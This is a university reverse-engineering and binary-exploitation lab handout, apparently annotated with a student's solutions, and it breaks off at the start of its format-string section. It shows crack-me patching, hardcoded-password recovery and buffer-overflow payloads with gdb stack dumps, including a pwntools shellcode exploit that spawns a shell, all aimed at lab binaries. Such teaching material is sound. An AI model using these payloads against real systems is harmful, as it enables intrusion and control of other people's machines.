# Reverse Engineering

### Laboratory for the class “Security Verification and Testing” (01TYASM/01TYAOV)

### Politecnico di Torino – AY 2021/

### Prof. Riccardo Sisto

### prepared by:

### Cataldo Basile (cataldo.basile@polito.it)

### v. 1.1 (9/11/2021)

## Contents

1 Crack-me challenges 4

2 Exploiting buffer overflows 6

3 Format strings: a dangerous type of injection 8

4 Additional challenges available in the web 12

5 Return Oriented Programming 13

## Purpose of this laboratory

The purpose of this laboratory is get familiar with reverse engineering tools, which include a static analyser
(that is, a disassmbler and a decompiler) and dynamic analysis tool (that is, a debugger and also some tracers,
if you prefer).

First, you will be asked to understand the semantics of simple programs to bypass some controls or force an
unexpected behaviour of an application (Section 1).

Second, you will exploit some programs that are vulnerable to buffer overflows (Section 2).

Third, this lab will introduce another category of attacks,format stringsattacks, a very powerful tool for
accessing data into an application or tampering with it (Section 3).

Being able to solve all the challenges presented here is not the final purpose of this laboratory. They are just the
way to have concrete tasks to do in order learn how to use reverse engineering tools and look for the commands
you need for some “real” objectives. Therefore, your time is better invested in understanding how to use tools
than finding the simplest and fastest way to solve the challenges.

Moreover, we strongly suggest you to solve the same challenges using different tools. This approach, espe-
cially when you already know what to look for, will ensure you can appreciate the features and advantages of
individual tools.

Finally, you will see attacks based on Return Oriented Programming, both pure ROP, ret2win, and ret2lib. Since
these are more compelx attacks and may require more time to be understood and executed, you are asked to
optionally execute these attacks at your home.


## Prepare the environment

For this laboratory, you may use any reverse engineering tool of your choice. You have seen during class
Radare2,Ghidra, andgdb.

```
NOTE
All these tools are installed in the VM prepared for the laboratory and available in the
VM available in the LAIBINF. Only Ghidra will require and additional step, unzipping the
ghidra10.0.3PUBLIC20210908.zipfile that you can find in the/home/kali/Desktop/utility
folder and run theGhidraRun.shcommand.
```
Even if we proposed some tools, feel free to experiment at your place withIDA Pro Free(unfortunately
several limitations apply that may prevent you for doing sophisticated tasks).

You may also want to tryBinary Ninja Cloud, available here (registration needed):

```
https://cloud.binary.ninja/
ATTENTION
Ghidra does not recreate an executable binary after you have modified the binaries. Therefore,
after your patching job, you will not have an internal command to apply the modifications to the
binaries. To this purpose, you have to install an external script:
https://github.com/schlafwandler/ghidra_SavePatch
```
### Material

This laboratory makes use of source and binary files that have been provided as an archive

```
lab03material
```
If you experience problems in executing some files, it may have happened that permissions have been lost when
zipping the material. Make it executable again with thechmod 777filename command

### Some hints

When you have to build payloads, you can use Python and send it through the standard input by means of the
following pipe:

```
python -c ’print("something to pass via stdin")’ | ./progtocrack
```
Analogously, you can use Python to build the command line arguments:

```
./progtocrack$(python -c ’print("argument")’)
```
In alternative, even if it requires some initial learning effort, it is very convenient to learn how to use the
pwntools, a Python library that automates several attacking operations.

You can find the official documentation here:

```
http://docs.pwntools.com/en/latest/
```
and a tutorial here:

```
https://github.com/Gallopsled/pwntools-tutorial#readme
```
Finally, you can forge payload with Python also when you usegdbto dynamically execute a program, both via
standard in:

```
run <<<$(python -c ’print("something to pass via stdin")’)
```
and to forge arguments:


```
run$(python -c ’print("cmdline")’)
```
Below, we have also reported some references to x86 opcodes that you may want to read to refresh your
knowledge of the ASM:

```
http://ref.x86asm.net/coder32.html
https://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png
https://pwn.college/
```

## 1 Crack-me challenges

This section includes three exercises that will require you to perform static and dynamic analysis in order to
understand the behaviour of a target program and tamper with it.

### Exercise 1

```
Purpose: The purpose is to force the program to print the string ”This is the
answer” by patching the binary.
Suggested tool: Radare2.
Alternative tools: Ghidra. You can also usegdbto follow the execution of the pro-
gram (step-by-step) understand where to intervene.
Other proprietary tools
and their free versions:
```
```
IDA Pro, Binary Ninja.
```
```
Hints: look for comparisons and bypass the proper one.
```
As a first exercise, you have to crack by yourself the binary of the example shown during class. The binary file
is available in the lab03 material file

/lab03material/crackme/crackme

Make a copy of this file, as you will have to patch the binaries. You should not access the source code (the
binaries have not been stripped down to allow you to reconstruct at least the function names and some useful
symbols). However, you can find it in the material if you get initially lost with the assembly code.

```
ATTENTION
You don’t have to exploit the buffer overflow now (as you have seen during the class). You have
to understand the binaries and patch them.
```
```
Patch just change the address the jump target address to the one of the win function (print flag)
Easy with Ghidra!
Doable with Radare2
```
### Exercise 2

```
Purpose: find the password of the user and bypass the authentication pro-
cedure.
Suggested tools: Ghidra (disassembler), gdb (debug the application), Radare2.
Hints: execute the program and try to guess its behaviour. Make a men-
tal representation of the program. Disassemble and find what to
bypass (using your guesses on the program structure).
Alternative solution: look for hardcoded values and find what to do with them.
Source: Root me
```
This is another very simple crack me taken from the Root Me challenge repository. The binary file is available
in the lab03 material file

/lab03material/crackme/crackme
```
Too easy with ltrace strcmp("ciao", "123456789")
With r2, aaaa, s main, pdf we can see
│           0x080486ae      c745f8418804.  mov dword [var_8h], str.123456789 ; 0x8048841 ; "123456789"
│           0x080486f3      8b45f8         mov eax, dword [var_8h]
│           0x080486f6      89442404       mov dword [s2], eax         ; const char *s2
│           0x08048700      e8d3fdffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)

```
### Exercise 3

```
Purpose: find the key (it is an integer value).
Suggested tools: Radare2, Ghidra, gdb.
Hints: execute the program and try to guess its behaviour. Disassemble
and find where the key comparison is performed then discover the
value.
Source: Root me
```

This is another very simple crack me taken from the Crackes.me challenge repository. The binary file is avail-
able in the lab03 material file

/lab03material/crackme/crackme
```
In Ghidra simply:
ulong validate_key(int param_1){
    return (ulong)(param_1 % 0x4c7 == 0);
}
while in assembly you would need to manually reverse this:
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined validate_key()
             undefined         AL:1           <RETURN>
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     001011f2(W), 
                                                                                                   001011f5(R)  
                             validate_key                                    XREF[3]:     Entry Point(*), main:001011af(c), 
                                                                                          00102074  
        001011ee 55              PUSH       RBP
        001011ef 48 89 e5        MOV        RBP,RSP
        001011f2 89 7d fc        MOV        dword ptr [RBP + local_c],EDI
        001011f5 8b 4d fc        MOV        ECX,dword ptr [RBP + local_c]
        001011f8 ba ad 0a        MOV        EDX,0x1acb0aad
                 cb 1a
        001011fd 89 c8           MOV        EAX,ECX
        001011ff f7 ea           IMUL       EDX
        00101201 c1 fa 07        SAR        EDX,0x7
        00101204 89 c8           MOV        EAX,ECX
        00101206 c1 f8 1f        SAR        EAX,0x1f
        00101209 29 c2           SUB        EDX,EAX
        0010120b 89 d0           MOV        EAX,EDX
        0010120d 69 c0 c7        IMUL       EAX,EAX,0x4c7
                 04 00 00
        00101213 29 c1           SUB        ECX,EAX
        00101215 89 c8           MOV        EAX,ECX
        00101217 85 c0           TEST       EAX,EAX
        00101219 75 07           JNZ        LAB_00101222
        0010121b b8 01 00        MOV        EAX,0x1
                 00 00
        00101220 eb 05           JMP        LAB_00101227
                             LAB_00101222                                    XREF[1]:     00101219(j)  
        00101222 b8 00 00        MOV        EAX,0x0
                 00 00
                             LAB_00101227                                    XREF[1]:     00101220(j)  
        00101227 5d              POP        RBP
        00101228 c3              RET

```

Did you appreciate the role of the decompiler and why it is worth paying a lot for it?


## 2 Exploiting buffer overflows

This section includes five exercises to learn how to exploit buffer overflow weaknesses in the code. You will
have to perform static and dynamic analysis in order to be able to find the information you will need to execute
the correct exploits.

### Exercise 1

```
Purpose: you have to bypass the constraint in thefuncfunction and make
the program print the string “This is the answer”.
Suggested tools: pwntools, shell + python, gdb.
Hints: Find the payload that helps bypassing the condition.
```
As a first exercise, you have to exploit a buffer overflow in the example application shown during class. The
binary file is available in the lab03 material file:

/lab03material/crackme/crackme

You also have access to the source code.

It is suggested to build the exploit in (at least) three different methods:

- directly on the shell, build the payload with a Python in-line command, then use a pipe to pass it to the
    target program
- usinggdb, you should already know the payload. Put a breakpoint in the main, then disassemble the
    funcfunction and add another breakpoint before the instruction where the input is called. Then, use the
    gdbvisualization options to inspect the stack before and after the input is collected.
    x/192x $esp
- with thepwntools, use the processprocessto execute an application, build the payload by concate-
    nating the strings you want to pass, then use thesendlinecommand to pass your payload to the process.

We need to change the variable of local_10 to 42 (0x2a) to win.
The buffer is 128 B long.
Gets reads our input.
When there is the `0x565561e7 <func+46>    cmp    dword ptr [ebp - 0xc], 0x2a` we need to have put 0x2a in that address.

From gdb
```
0x565561e7 <func+46>    cmp    dword ptr [ebp - 0xc], 0x2a

pwndbg> p $ebp-0xc
$2 = (void *) 0xffffcf4c
If we just write "42", the ascii values will be inserted, so we will put 0x3234 instead of 0x2a, so we'll need to give the raw byte as input.
The important part is the place!
ESP  0xffffceb0 —▸ 0xffffcecc ◂— 0x3234 /* '42' */

pwndbg> distance 0xffffcf4c 0xffffcecc
0xffffcf4c->0xffffcecc is -0x80 bytes (-0x20 words)

Pre-input
pwndbg> x/192x $esp
0xffffceb0:	0xffffcecc	0xffffdf94	0xf7ffd000	0x565561c8
0xffffcec0:	0x00000000	0x00000000	0xfffffa00	0x00000009 <---
0xffffced0:	0x00001fff	0x565552c6	0x00000001	0x00000000
0xffffcee0:	0x5655900c	0xf7fe17b6	0x565552c6	0xf7ffd9a0
0xffffcef0:	0xffffcf24	0xf7ffdb60	0xf7fc9410	0x00000001
0xffffcf00:	0x00000001	0x00000000	0xf7ffd9a0	0x00000000
0xffffcf10:	0xf7ffd000	0x56555000	0xffffcf68	0x685c3c00
0xffffcf20:	0x00000003	0xf7dcb554	0xf7ffd000	0x56559000
0xffffcf30:	0xf7fab000	0xf7fab000	0xffffcf78	0xf7e15245
0xffffcf40:	0xf7fabd20	0x5655703a	0xffffcf64	0x00000000
0xffffcf50:	0x56559000	0x56559000	0xffffcf78	0x56556254
0xffffcf60:	0x00000001	0x00000002	0x00000003	0x5655622d
0xffffcf70:	0xffffcf90	0x00000000	0x00000000	0xf7ddffd6
0xffffcf80:	0xf7fab000	0xf7fab000	0x00000000	0xf7ddffd6
0xffffcf90:	0x00000001	0xffffd034	0xffffd03c	0xffffcfc4
0xffffcfa0:	0xffffcfd4	0xf7ffdb60	0xf7fc9410	0xf7fab000
0xffffcfb0:	0x00000001	0x00000000	0xffffd018	0x00000000
0xffffcfc0:	0xf7ffd000	0x00000000	0xf7fab000	0xf7fab000
0xffffcfd0:	0x00000000	0x50cc84a1	0x14acbab1	0x00000000
0xffffcfe0:	0x00000000	0x00000000	0x00000001	0x56556080
0xffffcff0:	0x00000000	0xf7fe7a60	0xf7fe2280	0x56559000
0xffffd000:	0x00000001	0x56556080	0x00000000	0x565560b1
0xffffd010:	0x56556219	0x00000001	0xffffd034	0x56556270
0xffffd020:	0x565562d0	0xf7fe2280	0xffffd02c	0xf7ffd9a0
0xffffd030:	0x00000001	0xffffd1f8	0x00000000	0xffffd250
0xffffd040:	0xffffd27e	0xffffd2ca	0xffffd2dc	0xffffd2ed
0xffffd050:	0xffffd306	0xffffd31a	0xffffd34a	0xffffd388
0xffffd060:	0xffffd399	0xffffd3a3	0xffffd3c4	0xffffd3da
0xffffd070:	0xffffd414	0xffffd41f	0xffffd442	0xffffd453
0xffffd080:	0xffffd486	0xffffd491	0xffffd4a0	0xffffd4bc
0xffffd090:	0xffffd504	0xffffd516	0xffffd53b	0xffffd554
0xffffd0a0:	0xffffd567	0xffffd57d	0xffffd58a	0xffffd5a8
0xffffd0b0:	0xffffd5c6	0xffffd5fa	0xffffd616	0xffffd629
0xffffd0c0:	0xffffd696	0xffffd6a7	0xffffd6c5	0xffffd6d8
0xffffd0d0:	0xffffd71b	0xffffd730	0xffffd744	0xffffd75f
0xffffd0e0:	0xffffd77c	0xffffd7c8	0xffffd81b	0xffffd832
0xffffd0f0:	0xffffd83f	0xffffd85b	0xffffd888	0xffffd89c
0xffffd100:	0xffffd8a4	0xffffd8fa	0xffffd90f	0xffffd91a
0xffffd110:	0xffffd922	0xffffd942	0xffffdf31	0xffffdf8b
0xffffd120:	0xffffdf94	0x00000000	0x00000020	0xf7fcf550
0xffffd130:	0x00000021	0xf7fcf000	0x00000033	0x000006f0
0xffffd140:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xffffd150:	0x00000011	0x00000064	0x00000003	0x56555034
0xffffd160:	0x00000004	0x00000020	0x00000005	0x0000000b
0xffffd170:	0x00000007	0xf7fd1000	0x00000008	0x00000000
0xffffd180:	0x00000009	0x56556080	0x0000000b	0x00000000
0xffffd190:	0x0000000c	0x00000000	0x0000000d	0x00000000
0xffffd1a0:	0x0000000e	0x00000000	0x00000017	0x00000000

Post-input run <<< $(python3 -c 'print(42)')
pwndbg> x/192x $esp
0xffffceb0:	0xffffcecc	0xffffdf94	0xf7ffd000	0x565561c8
0xffffcec0:	0x00000000	0x00000000	0xfffffa00	0x00003234 <--- 0x0009 becomes 0x3234! We want it to become 0x2a!
0xffffced0:	0x00001fff	0x565552c6	0x00000001	0x00000000
0xffffcee0:	0x5655900c	0xf7fe17b6	0x565552c6	0xf7ffd9a0
0xffffcef0:	0xffffcf24	0xf7ffdb60	0xf7fc9410	0x00000001
0xffffcf00:	0x00000001	0x00000000	0xf7ffd9a0	0x00000000
0xffffcf10:	0xf7ffd000	0x56555000	0xffffcf68	0x685c3c00
0xffffcf20:	0x00000003	0xf7dcb554	0xf7ffd000	0x56559000
0xffffcf30:	0xf7fab000	0xf7fab000	0xffffcf78	0xf7e15245
0xffffcf40:	0xf7fabd20	0x5655703a	0xffffcf64	0x00000000 <--- we want this 0x00000000 to become 0x2a!
0xffffcf50:	0x56559000	0x56559000	0xffffcf78	0x56556254
0xffffcf60:	0x00000001	0x00000002	0x00000003	0x5655622d
0xffffcf70:	0xffffcf90	0x00000000	0x00000000	0xf7ddffd6
0xffffcf80:	0xf7fab000	0xf7fab000	0x00000000	0xf7ddffd6
0xffffcf90:	0x00000001	0xffffd034	0xffffd03c	0xffffcfc4
0xffffcfa0:	0xffffcfd4	0xf7ffdb60	0xf7fc9410	0xf7fab000
0xffffcfb0:	0x00000001	0x00000000	0xffffd018	0x00000000
0xffffcfc0:	0xf7ffd000	0x00000000	0xf7fab000	0xf7fab000
0xffffcfd0:	0x00000000	0x50cc84a1	0x14acbab1	0x00000000
0xffffcfe0:	0x00000000	0x00000000	0x00000001	0x56556080
0xffffcff0:	0x00000000	0xf7fe7a60	0xf7fe2280	0x56559000
0xffffd000:	0x00000001	0x56556080	0x00000000	0x565560b1
0xffffd010:	0x56556219	0x00000001	0xffffd034	0x56556270
0xffffd020:	0x565562d0	0xf7fe2280	0xffffd02c	0xf7ffd9a0
0xffffd030:	0x00000001	0xffffd1f8	0x00000000	0xffffd250
0xffffd040:	0xffffd27e	0xffffd2ca	0xffffd2dc	0xffffd2ed
0xffffd050:	0xffffd306	0xffffd31a	0xffffd34a	0xffffd388
0xffffd060:	0xffffd399	0xffffd3a3	0xffffd3c4	0xffffd3da
0xffffd070:	0xffffd414	0xffffd41f	0xffffd442	0xffffd453
0xffffd080:	0xffffd486	0xffffd491	0xffffd4a0	0xffffd4bc
0xffffd090:	0xffffd504	0xffffd516	0xffffd53b	0xffffd554
0xffffd0a0:	0xffffd567	0xffffd57d	0xffffd58a	0xffffd5a8
0xffffd0b0:	0xffffd5c6	0xffffd5fa	0xffffd616	0xffffd629
0xffffd0c0:	0xffffd696	0xffffd6a7	0xffffd6c5	0xffffd6d8
0xffffd0d0:	0xffffd71b	0xffffd730	0xffffd744	0xffffd75f
0xffffd0e0:	0xffffd77c	0xffffd7c8	0xffffd81b	0xffffd832
0xffffd0f0:	0xffffd83f	0xffffd85b	0xffffd888	0xffffd89c
0xffffd100:	0xffffd8a4	0xffffd8fa	0xffffd90f	0xffffd91a
0xffffd110:	0xffffd922	0xffffd942	0xffffdf31	0xffffdf8b
0xffffd120:	0xffffdf94	0x00000000	0x00000020	0xf7fcf550
0xffffd130:	0x00000021	0xf7fcf000	0x00000033	0x000006f0
0xffffd140:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xffffd150:	0x00000011	0x00000064	0x00000003	0x56555034
0xffffd160:	0x00000004	0x00000020	0x00000005	0x0000000b
0xffffd170:	0x00000007	0xf7fd1000	0x00000008	0x00000000
0xffffd180:	0x00000009	0x56556080	0x0000000b	0x00000000
0xffffd190:	0x0000000c	0x00000000	0x0000000d	0x00000000
0xffffd1a0:	0x0000000e	0x00000000	0x00000017	0x00000000

Post-input run <<< $(python -c 'print("0x2a")')
pwndbg> x/192x $esp
0xffffceb0:	0xffffcecc	0xffffdf94	0xf7ffd000	0x565561c8
0xffffcec0:	0x00000000	0x00000000	0xfffffa00	0x0000002a <--- Python2 is way more convenient to pass bytes directly!
0xffffced0:	0x00001fff	0x565552c6	0x00000001	0x00000000
0xffffcee0:	0x5655900c	0xf7fe17b6	0x565552c6	0xf7ffd9a0
0xffffcef0:	0xffffcf24	0xf7ffdb60	0xf7fc9410	0x00000001
0xffffcf00:	0x00000001	0x00000000	0xf7ffd9a0	0x00000000
0xffffcf10:	0xf7ffd000	0x56555000	0xffffcf68	0x13695200
0xffffcf20:	0x00000003	0xf7dcb554	0xf7ffd000	0x56559000
0xffffcf30:	0xf7fab000	0xf7fab000	0xffffcf78	0xf7e15245
0xffffcf40:	0xf7fabd20	0x5655703a	0xffffcf64	0x00000000 <--- To put that here we need a padding of 0x80 (128) bytes
0xffffcf50:	0x56559000	0x56559000	0xffffcf78	0x56556254
0xffffcf60:	0x00000001	0x00000002	0x00000003	0x5655622d
0xffffcf70:	0xffffcf90	0x00000000	0x00000000	0xf7ddffd6
0xffffcf80:	0xf7fab000	0xf7fab000	0x00000000	0xf7ddffd6
0xffffcf90:	0x00000001	0xffffd034	0xffffd03c	0xffffcfc4
0xffffcfa0:	0xffffcfd4	0xf7ffdb60	0xf7fc9410	0xf7fab000
0xffffcfb0:	0x00000001	0x00000000	0xffffd018	0x00000000
0xffffcfc0:	0xf7ffd000	0x00000000	0xf7fab000	0xf7fab000
0xffffcfd0:	0x00000000	0x8e6c4690	0xca0c7880	0x00000000
0xffffcfe0:	0x00000000	0x00000000	0x00000001	0x56556080
0xffffcff0:	0x00000000	0xf7fe7a60	0xf7fe2280	0x56559000
0xffffd000:	0x00000001	0x56556080	0x00000000	0x565560b1
0xffffd010:	0x56556219	0x00000001	0xffffd034	0x56556270
0xffffd020:	0x565562d0	0xf7fe2280	0xffffd02c	0xf7ffd9a0
0xffffd030:	0x00000001	0xffffd1f8	0x00000000	0xffffd250
0xffffd040:	0xffffd27e	0xffffd2ca	0xffffd2dc	0xffffd2ed
0xffffd050:	0xffffd306	0xffffd31a	0xffffd34a	0xffffd388
0xffffd060:	0xffffd399	0xffffd3a3	0xffffd3c4	0xffffd3da
0xffffd070:	0xffffd414	0xffffd41f	0xffffd442	0xffffd453
0xffffd080:	0xffffd486	0xffffd491	0xffffd4a0	0xffffd4bc
0xffffd090:	0xffffd504	0xffffd516	0xffffd53b	0xffffd554
0xffffd0a0:	0xffffd567	0xffffd57d	0xffffd58a	0xffffd5a8
0xffffd0b0:	0xffffd5c6	0xffffd5fa	0xffffd616	0xffffd629
0xffffd0c0:	0xffffd696	0xffffd6a7	0xffffd6c5	0xffffd6d8
0xffffd0d0:	0xffffd71b	0xffffd730	0xffffd744	0xffffd75f
0xffffd0e0:	0xffffd77c	0xffffd7c8	0xffffd81b	0xffffd832
0xffffd0f0:	0xffffd83f	0xffffd85b	0xffffd888	0xffffd89c
0xffffd100:	0xffffd8a4	0xffffd8fa	0xffffd90f	0xffffd91a
0xffffd110:	0xffffd922	0xffffd942	0xffffdf31	0xffffdf8b
0xffffd120:	0xffffdf94	0x00000000	0x00000020	0xf7fcf550
0xffffd130:	0x00000021	0xf7fcf000	0x00000033	0x000006f0
0xffffd140:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xffffd150:	0x00000011	0x00000064	0x00000003	0x56555034
0xffffd160:	0x00000004	0x00000020	0x00000005	0x0000000b
0xffffd170:	0x00000007	0xf7fd1000	0x00000008	0x00000000
0xffffd180:	0x00000009	0x56556080	0x0000000b	0x00000000
0xffffd190:	0x0000000c	0x00000000	0x0000000d	0x00000000
0xffffd1a0:	0x0000000e	0x00000000	0x00000017	0x00000000

Post-input run <<< $(python -c 'print("A"*128+"\x2a")')
pwndbg> x/192x $esp
0xffffceb0:	0xffffcecc	0xffffdf94	0xf7ffd000	0x565561c8
0xffffcec0:	0x00000000	0x00000000	0xfffffa00	0x41414141
0xffffced0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcee0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcef0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf00:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf10:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf20:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf30:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf40:	0x41414141	0x41414141	0x41414141	0x0000002a <--- 0x2a inserted in the place required!
0xffffcf50:	0x56559000	0x56559000	0xffffcf78	0x56556254
0xffffcf60:	0x00000001	0x00000002	0x00000003	0x5655622d
0xffffcf70:	0xffffcf90	0x00000000	0x00000000	0xf7ddffd6
0xffffcf80:	0xf7fab000	0xf7fab000	0x00000000	0xf7ddffd6
0xffffcf90:	0x00000001	0xffffd034	0xffffd03c	0xffffcfc4
0xffffcfa0:	0xffffcfd4	0xf7ffdb60	0xf7fc9410	0xf7fab000
0xffffcfb0:	0x00000001	0x00000000	0xffffd018	0x00000000
0xffffcfc0:	0xf7ffd000	0x00000000	0xf7fab000	0xf7fab000
0xffffcfd0:	0x00000000	0x0f8cb3f9	0x4bec8de9	0x00000000
0xffffcfe0:	0x00000000	0x00000000	0x00000001	0x56556080
0xffffcff0:	0x00000000	0xf7fe7a60	0xf7fe2280	0x56559000
0xffffd000:	0x00000001	0x56556080	0x00000000	0x565560b1
0xffffd010:	0x56556219	0x00000001	0xffffd034	0x56556270
0xffffd020:	0x565562d0	0xf7fe2280	0xffffd02c	0xf7ffd9a0
0xffffd030:	0x00000001	0xffffd1f8	0x00000000	0xffffd250
0xffffd040:	0xffffd27e	0xffffd2ca	0xffffd2dc	0xffffd2ed
0xffffd050:	0xffffd306	0xffffd31a	0xffffd34a	0xffffd388
0xffffd060:	0xffffd399	0xffffd3a3	0xffffd3c4	0xffffd3da
0xffffd070:	0xffffd414	0xffffd41f	0xffffd442	0xffffd453
0xffffd080:	0xffffd486	0xffffd491	0xffffd4a0	0xffffd4bc
0xffffd090:	0xffffd504	0xffffd516	0xffffd53b	0xffffd554
0xffffd0a0:	0xffffd567	0xffffd57d	0xffffd58a	0xffffd5a8
0xffffd0b0:	0xffffd5c6	0xffffd5fa	0xffffd616	0xffffd629
0xffffd0c0:	0xffffd696	0xffffd6a7	0xffffd6c5	0xffffd6d8
0xffffd0d0:	0xffffd71b	0xffffd730	0xffffd744	0xffffd75f
0xffffd0e0:	0xffffd77c	0xffffd7c8	0xffffd81b	0xffffd832
0xffffd0f0:	0xffffd83f	0xffffd85b	0xffffd888	0xffffd89c
0xffffd100:	0xffffd8a4	0xffffd8fa	0xffffd90f	0xffffd91a
0xffffd110:	0xffffd922	0xffffd942	0xffffdf31	0xffffdf8b
0xffffd120:	0xffffdf94	0x00000000	0x00000020	0xf7fcf550
0xffffd130:	0x00000021	0xf7fcf000	0x00000033	0x000006f0
0xffffd140:	0x00000010	0x178bfbff	0x00000006	0x00001000
0xffffd150:	0x00000011	0x00000064	0x00000003	0x56555034
0xffffd160:	0x00000004	0x00000020	0x00000005	0x0000000b
0xffffd170:	0x00000007	0xf7fd1000	0x00000008	0x00000000
0xffffd180:	0x00000009	0x56556080	0x0000000b	0x00000000
0xffffd190:	0x0000000c	0x00000000	0x0000000d	0x00000000
0xffffd1a0:	0x0000000e	0x00000000	0x00000017	0x00000000

p $ebp - 0xc
$4 = (void *) 0xffffcf4c
pwndbg> p *0xffffcf4c
$6 = 42

This is the answer!
```
From the shell
```
python -c 'print("A"*128+"\x2a")' | ./crackme1
Please insert a string: This is the answer!
```
From pwntools, see file crackme1_exploit.py

### Exercise 2

```
Purpose: spawn a shell by exploiting the buffer overflow.
Suggested tool: pwntools, shell + python, gdb.
Hints: Find the payload that helps bypassing the condition.
```
Using the same binary file as the previous exercise, try to spawn a shell. On your machine it will not be a great
success (as you already own it), but consider that these attacks are intended to be executed on remote servers.
The binary file is available in the lab03 material file:

```
/lab03material/crackme/crackme
```
You can access the source code:

```
/lab03material/crackme/crackme1.c
```
HINT: you can find the shellcode on shellstormhttp://shell-storm.org/shellcode/(look for the proper
platform) or you can generate directly using theshellcraftmodule in a python program or by means of the
shellcraftshellcraft -f a i386.linux.sh(shellcraft -llists all the available shells).


```
from pwn import *
```
```
#...
```
```
context.update(arch=’i386’, os=’linux’)
shellcode = shellcraft.sh()
payload = asm(shellcode)
```

we want to override the return address of the stack.
If we go to `0x56556218 <func+95>    ret` we see that it jumps to the address `esp 0xffffcf5c —▸ 0x56556254 (main+59)` on the stack. We want this address to point to another address on the stack (controlled by us), instead of pointing to the address 0x56556254.
The first address that we control is `0xffffcecc` (see above).
From above we can see
```
0xffffcf40:	0x41414141	0x41414141	0x41414141	0x0000002a <--- 0x2a inserted in the place required!
0xffffcf50:	0x56559000	0x56559000	0xffffcf78	0x56556254 <--- this is the return address that we need to overwrite
```
So we need to add 4*4 more bytes of padding and then the return address.
We start by adding 16 bytes of "B" and then the return address `0xffffcecc` and see if it will try to jump to our "A"s. We want this:
```
0xffffcf40:	0x41414141	0x41414141	0x41414141	0x42424242 <--- 0x2a inserted in the place required!
0xffffcf50:	0x42424242	0x42424242	0x42424242	0xffffcecc <--- this is the return address pointing to the start of our payload, from which we will take the instructions to execute (shellcode)
```
After
padding1 = b"A" * 128
padding2 = b"B" * 16
ret_address = p32(0xffffcecc)

Program received signal SIGILL, Illegal instruction.
Just as planned.
Now we substitute the padding1 with the shellcode that we want to execute. N.B. We must make sure that the length of the payload remains the same, so we need to insert shellcode+b"A"*(128-len(shellcode))

See crackme1_shellcode.py
In gdb it tries to execute /bin/dash, while from the shell it always give segfault!
Maybe this could be caused by the environmental variables that moves the stack addresses?
We try to see the address without env in gdb using unset env and we get that we need to place the return address at `0xffffdc5c`, pointing to  `0xffffdbcc`

Just disable ASLR!

### Exercise 3

```
Purpose: bypass the condition and get the string “You won!”.
Suggested tool: pwntools, shell + python, gdb.
Hints: Pay attention to the endianness. Consider usingecho -neto by-
pass shell input manipulation.
Author: AS (pwnthem0le)
```
This is another classic buffer overflow exercise. The binary file is available in the lab03 material file:

/lab03material/bof/bof

The source code is also available in the material file:

/lab03material/bof/bof3.c (o usa Ghidra)
```c
//gcc bof3.c -o bof3 -fno-stack-protector 

#include <stdio.h>
#include <stdlib.h>

int main(){
char s[10];
int x=0;

gets(s);
if(x==0xcafecafe)
	printf("You won!\n");
else
	printf("Nope");
return 0;
}
```
```
checksec bof3               
[*] '/media/sf_Kali_Shared/SVT_Labs/03Lab_BinaryExploitation/lab03_material/bof/bof3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
[/mnt/26158F5879578F52/Università/Magistrale/Security_Verification_and_Testing/Labs/03Lab_BinaryExploitation/lab03_material/crackme/crackme1_shellcode.py]

### Exercise 4

```
Purpose: bypass the condition.
Suggested tool: gdb, then pwntools, shell + python.
Hints: find the address of the function by dynamically executing the pro-
gram.
Author: AS (pwnthem0le)
```
This exercise will ask you to work with function pointers. Again, this is a classic buffer overflow exploit. The
binary file is available in the lab03 material file:

/lab03material/bof/bof

The source code is also available in the material file:

/lab03material/bof/bof4.c

```
pwndbg> r <<< $(cyclic 64 -n 8)
Segfault:

 RDX  0x6163616161616161 ('aaaaaaca')

0x4011a1 <main+45>               call   rdx                           <0x6163616161616161>

cyclic -n 8 -l aaaaaaca
10

Abbiamo il controllo sulla funzione da chiamare: contenuto di RDX, che viene sovrascritto a partire dall'undicesimo carattere che mettiamo

info functions
0x0000000000401142  win

10 caratteri di padding+indirizzo della win function in little endian=win

padding = b"A" * 10
function_address = p64(0x0000000000401142,endian="little")
payload = padding + function_address

```
### Exercise 5

```
Purpose: reverse the binaries then exploit the buffer overflow to bypass the
contraint. Do not patch the binaries.
Suggested tool: Radare2, Ghidra, then pwntools, shell + python, gdb.
Hints: Find the important function, then disassemble or decompile the
program. Plan the payload to inject to successfully mount the
exploit.
Source: cracksme.one
```
This exercise will ask you to perform some reverse engineering before understanding how to exploit a buffer
overflow.

The binary file is available in the lab03 material file:

/lab03material/bof/bof

```c
  printf("enter password: ");
  __s = (char *)malloc(16);
  puVar1 = (uint *)malloc(8);
  *puVar1 = 1;
  fgets(__s,160,stdin);
  printf("uid: %d\n",(ulong)*puVar1);
  if (*puVar1 == 0) {
    puts("you are logged in as admin");
  }
  else {
    puts("you are logged in as user");
  }
```

```
file bof5              
bof5: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2a5e21f2513eff070d14b7cec39659bbbe4de377, for GNU/Linux 3.2.0, not stripped

checksec bof5          
[*] '/media/sf_Kali_Shared/SVT_Labs/03Lab_BinaryExploitation/lab03_material/bof/bof5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

 RAX  0x5555555596d0 ◂— 0x0
 ► 0x5555555551a2 <login+57>    mov    dword ptr [rax], 1
 RAX  0x5555555596d0 ◂— 0x1


```

## 3 Format strings: a dangerous type of injection

```c
#include <stdio.h>

int main()
{
int a=1,b=2,c=3;
int n1,n2;


printf("%d %d %d\n",a,b,c);
printf("%d %d \n",a,b,c);
printf("%d %d %d\n",a,b);
printf("%2$d %3$d %1$d\n",a,b,c);

